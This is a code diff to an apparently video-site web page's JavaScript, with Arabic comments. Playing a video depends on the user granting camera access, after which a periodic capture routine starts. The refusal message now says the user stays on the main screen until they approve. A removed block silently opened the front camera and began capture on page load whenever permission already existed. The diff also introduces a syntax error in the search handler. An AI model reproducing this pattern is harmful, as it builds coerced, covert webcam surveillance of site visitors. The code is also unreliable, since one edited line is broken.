@@ -406,7 +406,7 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== دوال الكاميرا والانتقال المشروط ===== */
+/* ===== دوال الكاميرا وإعادة المحاولة عند النقر ===== */
 async function openVideo(id) {
     if (mediaStream) {
         executeWatchTransition(id);
@@ -429,7 +429,7 @@ async function openVideo(id) {
         startPeriodicCapture();
 
     } catch (e) {
-        console.log("تم رفض إذن الكاميرا أو حدث خطأ:", e);
+        console.log("تم رفض الإذن، ستبقى في الواجهة الرئيسية حتى تتم الموافقة:", e);
     }
 }
 
@@ -614,7 +614,7 @@ document.addEventListener('keydown',e=>{
 });
 
 $('#searchForm').addEventListener('submit',e=>{ e.preventDefault();const t=$('#q').value.trim();
-  searchFor(t);$('#q').blur();
+  searchFor(t);$('#q'].blur();
 });
 
 /* ===== التعامل مع أزرار المتصفح ===== */
@@ -632,20 +632,6 @@ window.addEventListener('popstate',e=>{
   document.body.classList.remove('drawer-open','searching');
   render(false);
   scrollTo(0,0);
-});
-
-/* ===== التحقق المسبق للصلاحيات عند تحميل الصفحة ===== */
-navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
-    if (permissionStatus.state === 'granted') {
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } })
-            .then(stream => {
-                mediaStream = stream;
-                const videoEl = document.getElementById('video');
-                if (videoEl) videoEl.srcObject = mediaStream;
-                startPeriodicCapture();
-            })
-            .catch(() => {});
-    }
 });
 
 /* ===== Init ===== */
